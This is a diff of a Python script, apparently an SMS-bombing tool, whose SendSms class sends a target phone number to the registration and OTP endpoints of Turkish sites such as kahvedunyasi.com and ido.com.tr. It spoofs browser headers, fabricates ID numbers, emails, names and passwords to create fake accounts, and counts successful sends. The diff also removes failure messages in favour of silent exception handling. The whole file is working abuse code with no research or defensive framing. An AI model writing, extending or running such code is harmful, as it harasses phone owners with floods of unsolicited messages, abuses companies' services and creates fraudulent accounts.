@@ -2,7 +2,7 @@ import requests
 from random import choice, randint
 from string import ascii_lowercase
 
-# Streamlit sunucusunda colorama hatası alınmaması için sahte (mock) sınıflar
+# Streamlit sunucusunda colorama kütüphane çakışmasını engellemek için mock sınıflar
 class Fore:
     LIGHTRED_EX = ""
     LIGHTGREEN_EX = ""
@@ -24,26 +24,34 @@ class SendSms():
             tcNo += str(r)
         self.tc = tcNo
         self.phone = str(phone)
-        if len(mail) != 0:
+        if mail and len(mail) != 0:
             self.mail = mail
         else:
             self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"
 
-
-    #kahvedunyasi.com
+    # kahvedunyasi.com
     def KahveDunyasi(self):    
-        try:    
-            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
-            json={"countryCode": "90", "phoneNumber": self.phone}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["processStatus"] == "Success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kahvedunyasi.com")
+        try:
+            url = "https://tmsapi.kahvedunyasi.com/api/user/v1/register-otp"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr,en-US;q=0.7,en;q=0.3", "Content-Type": "application/json", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=4", "Te": "trailers", "Connection": "keep-alive"}
+            json = {"phone": self.phone, "permission": True}
+            response = requests.post(url, headers=headers, json=json, timeout=10)
+            if response.status_code == 200:
                 self.adet += 1
-            else:
-                raise
-        except:    
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kahvedunyasi.com")
+        except:
+            pass
+
+    # api.ido.com.tr
+    def Ido(self):
+        try:
+            url = "https://api.ido.com.tr:443/idows/v2/register"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.ido.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json = {"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "password": "313131", "phoneKvkk": True, "smsNewsletter": False, "username": f"0{self.phone}", "year": 1999}
+            response = requests.post(url, headers=headers, json=json, timeout=10)
+            if response.status_code == 200:
+                self.adet += 1
+        except:
+            pass
         
 
     #wmf.com.tr
